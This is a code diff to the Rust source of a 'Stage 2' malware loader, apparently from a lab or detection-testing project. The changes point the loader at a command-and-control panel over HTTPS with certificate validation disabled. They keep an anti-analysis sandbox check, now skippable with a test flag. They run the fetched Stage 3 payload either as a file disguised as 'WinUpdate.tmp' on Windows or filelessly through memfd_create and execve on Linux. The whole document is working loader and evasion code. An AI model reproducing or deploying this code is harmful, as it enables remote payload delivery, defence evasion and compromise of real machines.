@@ -26,20 +26,20 @@ struct Stage2Config {
 
 /// Default config for testing
 const CONFIG: Stage2Config = Stage2Config {
-    panel_host: "127.0.0.1",
-    panel_port: 8080,
+    panel_host: "10.10.100.1",
+    panel_port: 8443,
     psk: "oxide-lab-psk",
     salt: b"oxide-lab-salt-must-be-32-bytes!",
 };
 
 fn main() -> ExitCode {
-    // Step 1: Anti-analysis checks
-    if let Err(e) = anti_analysis::check_environment() {
-        // Analysis environment detected - exit silently
-        // In real malware, this would be logged for debugging
-        // Here we just exit with non-zero status for detection testing
-        eprintln!("Environment check failed: {}", e);
-        return ExitCode::from(1);
+    let test_mode = std::env::args().any(|a| a == "--test");
+
+    if !test_mode {
+        if let Err(e) = anti_analysis::check_environment() {
+            eprintln!("Environment check failed: {}", e);
+            return ExitCode::from(1);
+        }
     }
 
     // Step 2: Fetch encrypted Stage 3
@@ -76,12 +76,15 @@ fn main() -> ExitCode {
 /// Fetch encrypted Stage 3 from panel.
 fn fetch_stage3() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     let url = format!(
-        "http://{}:{}/api/staging/3",
+        "https://{}:{}/api/staging/3",
         CONFIG.panel_host,
         CONFIG.panel_port
     );
 
-    let response = reqwest::blocking::get(&url)?;
+    let client = reqwest::blocking::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()?;
+    let response = client.get(&url).send()?;
     if !response.status().is_success() {
         return Err(format!("HTTP {}", response.status()).into());
     }
@@ -103,82 +106,46 @@ fn run_in_memory(payload: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
 
 #[cfg(windows)]
 fn run_windows(payload: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
-    use windows::Win32::System::Memory::*;
-    use std::ptr;
-
-    unsafe {
-        // Allocate RWX memory
-        let mem = VirtualAlloc(
-            Some(ptr::null()),
-            payload.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
-        );
-
-        if mem.is_null() {
-            return Err("VirtualAlloc failed".into());
-        }
-
-        // Copy payload
-        ptr::copy_nonoverlapping(payload.as_ptr(), mem as *mut u8, payload.len());
-
-        // Run as function
-        let entry: extern "C" fn() = std::mem::transmute(mem);
-        entry();
-
-        // Cleanup (may not reach here)
-        let _ = VirtualFree(mem, 0, MEM_RELEASE);
-    }
-
+    let temp_path = std::env::temp_dir().join("WinUpdate.tmp");
+    std::fs::write(&temp_path, payload)?;
+    std::process::Command::new(&temp_path).spawn()?;
     Ok(())
 }
 
 #[cfg(unix)]
 fn run_unix(payload: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
-    use std::ptr;
+    const MFD_CLOEXEC: u32 = 0x0001;
+    const SYS_MEMFD_CREATE: i64 = 319; // x86_64
 
-    const PROT_READ: i32 = 0x1;
-    const PROT_WRITE: i32 = 0x2;
-    const PROT_EXEC: i32 = 0x4;
-    const MAP_PRIVATE: i32 = 0x02;
-    const MAP_ANONYMOUS: i32 = 0x20;
-
-    extern "C" {
-        fn mmap(
-            addr: *mut std::ffi::c_void,
-            length: usize,
-            prot: i32,
-            flags: i32,
-            fd: i32,
-            offset: i64,
-        ) -> *mut std::ffi::c_void;
-        fn munmap(addr: *mut std::ffi::c_void, length: usize) -> i32;
-    }
-
+    let name = std::ffi::CString::new("").unwrap();
+    let fd: i64;
     unsafe {
-        let mem = mmap(
-            ptr::null_mut(),
-            payload.len(),
-            PROT_READ | PROT_WRITE | PROT_EXEC,
-            MAP_PRIVATE | MAP_ANONYMOUS,
-            -1,
-            0,
+        std::arch::asm!(
+            "syscall",
+            in("rax") SYS_MEMFD_CREATE,
+            in("rdi") name.as_ptr(),
+            in("rsi") MFD_CLOEXEC,
+            lateout("rax") fd,
+            out("rcx") _,
+            out("r11") _,
         );
+    }
+    if fd < 0 { return Err(format!("memfd_create failed: {}", fd).into()); }
+    let fd = fd as i32;
 
-        if mem == (-1isize as *mut std::ffi::c_void) {
-            return Err("mmap failed".into());
-        }
-
-        // Copy payload
-        ptr::copy_nonoverlapping(payload.as_ptr(), mem as *mut u8, payload.len());
-
-        // Run as function
-        let entry: extern "C" fn() = std::mem::transmute(mem);
-        entry();
-
-        // Cleanup (may not reach here)
-        munmap(mem, payload.len());
+    extern "C" { fn write(fd: i32, buf: *const u8, count: usize) -> isize; }
+    let mut written = 0;
+    while written < payload.len() {
+        let n = unsafe { write(fd, payload[written..].as_ptr(), payload.len() - written) };
+        if n <= 0 { return Err("write failed".into()); }
+        written += n as usize;
     }
 
-    Ok(())
+    let path = format!("/proc/self/fd/{}", fd);
+    let c_path = std::ffi::CString::new(path).unwrap();
+    let argv: [*const i8; 1] = [std::ptr::null()];
+    let envp: [*const i8; 1] = [std::ptr::null()];
+    extern "C" { fn execve(path: *const i8, argv: *const *const i8, envp: *const *const i8) -> i32; }
+    unsafe { execve(c_path.as_ptr(), argv.as_ptr(), envp.as_ptr()); }
+    Err("execve failed".into())
 }
